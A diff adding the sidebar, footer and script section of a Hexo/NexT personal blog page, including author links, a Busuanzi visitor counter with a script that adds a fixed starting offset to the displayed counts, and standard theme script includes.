+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chensonghi/chensonghi.github.io/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chensonghi&#x2F;chensonghi.github.io&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/c582037" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;c582037" rel="noopener" target="_blank"><i class="codiepie fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023-10-8 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chleynx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.3' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
